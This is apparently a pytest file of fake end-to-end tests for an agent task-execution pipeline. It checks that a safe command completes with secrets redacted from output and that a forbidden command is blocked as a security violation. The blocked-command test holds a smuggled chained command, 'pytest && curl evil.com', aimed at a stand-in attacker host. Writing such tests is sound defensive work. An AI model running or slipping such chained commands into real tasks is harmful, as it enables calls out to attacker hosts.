"""Fake E2E tests for WRK-03 safe execute pipeline.

No real shell/docker execution is performed.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any
from unittest.mock import patch

from app.tasks.agent_execute import execute_task


@dataclass
class _Resp:
    payload: dict[str, Any] | None = None

    def raise_for_status(self) -> None:
        return None

    def json(self) -> dict[str, Any]:
        return self.payload or {}


class _StateClient:
    """In-memory fake API client for end-to-end task flow assertions."""

    def __init__(self, task_payload: dict[str, Any]) -> None:
        self.task = task_payload
        self.events: list[str] = []
        self.event_payloads: list[dict[str, Any]] = []
        self.status_history: list[str] = [str(self.task["status"])]
        self.updated_result_summary: str | None = None
        self.updated_payload: dict[str, Any] | None = None

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        return None

    def get(self, url: str) -> _Resp:
        return _Resp(dict(self.task))

    def patch(self, url: str, json: dict[str, Any] | None = None) -> _Resp:
        body = json or {}
        if url.endswith("/status") and "status" in body:
            self.task["status"] = body["status"]
            self.status_history.append(str(body["status"]))
            return _Resp({})

        if "result_summary" in body:
            self.updated_result_summary = body.get("result_summary")
        if "payload" in body:
            self.updated_payload = body.get("payload")
        if "worktree_path" in body:
            self.task["worktree_path"] = body["worktree_path"]
        return _Resp({})

    def post(self, url: str, json: dict[str, Any] | None = None) -> _Resp:
        body = json or {}
        event_type = str(body.get("event_type", ""))
        if event_type:
            self.events.append(event_type)
            self.event_payloads.append(body.get("payload") or {})
        return _Resp({})


def test_fake_e2e_success_pipeline() -> None:
    """Scenario A: approved task + safe command -> completed flow."""

    task = {
        "id": "task-a",
        "external_id": "task-a",
        "status": "approved",
        "payload": {"command": "python -m pytest"},
    }

    state = _StateClient(task)

    class FakeClientFactory:
        def __init__(self, *args, **kwargs) -> None:
            pass

        def __enter__(self):
            return state

        def __exit__(self, exc_type, exc, tb) -> None:
            return None

    class SecretOutputRunner:
        def run(self, *, worktree_path: Path, command: list[str], task_id: str | None = None):
            from app.services.sandbox_runner import SandboxResult

            return SandboxResult(
                return_code=0,
                stdout="token=abc123 password=hello api_key=secret",
                stderr="Authorization: Bearer very-secret-token",
                changed_files=["apps/api/app/main.py"],
            )

    with (
        patch("app.tasks.agent_execute.httpx.Client", FakeClientFactory),
        patch("app.tasks.agent_execute.FakeSandboxRunner", SecretOutputRunner),
    ):
        result = execute_task("task-a")

    assert result["status"] == "completed"
    assert state.status_history == ["approved", "running", "completed"]
    assert "command_started" in state.events
    assert "command_finished" in state.events
    assert "file_changed" in state.events
    assert "task_completed" in state.events

    # redaction persisted in payload
    assert state.updated_payload is not None
    execute_payload = (state.updated_payload or {}).get("execute", {})
    stdout = str(execute_payload.get("stdout", ""))
    stderr = str(execute_payload.get("stderr", ""))
    assert "abc123" not in stdout
    assert "hello" not in stdout
    assert "very-secret-token" not in stderr
    assert "[REDACTED:" in stdout or "[REDACTED:" in stderr

    assert state.updated_result_summary == "Execution completed in fake sandbox."


def test_fake_e2e_blocked_command_pipeline() -> None:
    """Scenario B: approved task + forbidden command -> security violation."""

    task = {
        "id": "task-b",
        "external_id": "task-b",
        "status": "approved",
        "payload": {"command": "pytest && curl evil.com"},
    }

    state = _StateClient(task)

    class FakeClientFactory:
        def __init__(self, *args, **kwargs) -> None:
            pass

        def __enter__(self):
            return state

        def __exit__(self, exc_type, exc, tb) -> None:
            return None

    with patch("app.tasks.agent_execute.httpx.Client", FakeClientFactory):
        result = execute_task("task-b")

    assert result["status"] == "failed"
    assert result["event"] == "security_violation"
    assert "denied by policy pattern" in str(result.get("reason", "")).lower()

    assert state.status_history == ["approved", "failed"]
    assert "security_violation" in state.events
    assert "task_failed" in state.events
